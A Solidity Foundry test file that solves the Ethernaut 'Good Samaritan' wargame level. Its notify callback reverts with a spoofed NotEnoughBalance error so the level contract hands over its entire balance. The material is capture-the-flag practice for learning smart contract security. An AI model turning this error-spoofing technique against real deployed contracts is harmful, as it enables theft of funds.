pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/27-GoodSamaritan/GoodSamaritan.sol";
import "../../src/ethernaut/27-GoodSamaritan/GoodSamaritanFactory.sol";

error NotEnoughBalance();

contract GoodSamaritanTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        GoodSamaritanFactory factory = new GoodSamaritanFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);

        GoodSamaritan good = GoodSamaritan(levelAddress);
        good.requestDonation();
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
